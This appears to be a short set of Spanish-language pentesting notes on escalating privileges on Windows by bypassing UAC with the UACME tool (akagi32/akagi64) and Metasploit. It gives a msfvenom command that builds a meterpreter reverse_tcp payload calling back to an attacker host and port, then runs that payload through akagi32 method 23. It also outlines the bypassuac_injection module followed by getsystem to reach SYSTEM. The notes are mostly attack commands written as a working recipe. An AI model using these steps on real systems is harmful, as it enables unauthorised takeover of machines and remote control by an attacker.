forma de escalar privilegios en windows via teniendo acceso a un usuario con permisos de grupo administrador, y modificando sus privilegios con herramientas akagi64.exe.
https://github.com/hfiref0x/UACME

```
comando windows en shell
net user -> lista usuarios
net localgroup administrators -> lista usuarios que se encuentran con permisos de administrador
```

utilizacion:
```
akagi32.exe [Method_Number] [Optional_Command]
```

webshell hecho con msfvenom (msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.1 LPORT=4444 -f exe -o rev.exe)
```
C:\temp\akagi32.exe 23 c:\temp\rev.exe
```
*el numero elegido depende del sistema operativo e info general del equipo atacado (ver detalle en github)
*importante dar toda la ruta sino, no se ejecuta el ejecutable y no dara acceso al multi/handler que se tiene seteado en paralelo*


**Necesarios**
usuario con permisos de grupo administrador.

utilitarios en meterpreter
getprivs -> lista los privilegios del usuario

------
**Otra forma**
- es luego de tener una session en meterpreter, utilizar el exploit windows/local/bypassuac_injection, el cual automatiza toda la segunda parte de escalado de privilegios
*Importante: luego de usar el exploit, va a permitir usar getsystem para subir a nt authority/system*


